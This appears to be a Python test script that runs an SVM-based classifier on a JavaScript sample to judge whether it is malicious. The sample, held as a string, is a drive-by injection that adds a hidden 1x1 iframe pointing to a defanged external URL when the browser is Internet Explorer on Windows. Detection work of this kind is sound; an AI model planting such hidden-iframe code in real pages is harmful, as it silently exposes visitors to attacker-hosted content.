from svmutil import svm_predict
from Project.ScriptVector import scriptVectorize
from Project.TrainData import createModel

def evaluate(s):
    values = scriptVectorize(s)
    m = createModel()
    p_label, p_acc, p_val = svm_predict([0], values, m, '-q')
    return p_label


s = r'''
function MakeFrameEx(){
  element = do​cument.get​ElementById('yahoo_api');
  if (!element){
    var el = do​cument.cr​eateElement('if​rame');
    do​cument.body.append​Child(el);
    el.id = 'yahoo_api';
    el.style.width = '1px';
    el.style.height = '1px';
    el.style.display = 'none';
    el.src = 'hxxp://​juyfdjhdjdgh​.nl​.ai​/showthread.php?t=72241732'
  }
}
var ua = navigator.userAgent.toLowerCase();
if (((ua.indexOf("msie") !=- 1 && ua.indexOf("opera") ==- 1 && ua.indexOf("webtv") ==- 1))
 && ua.indexOf("windows") !=- 1){
  var t = setTimeout("MakeFrameEx()", 1000)
}
'''
print(evaluate(s))
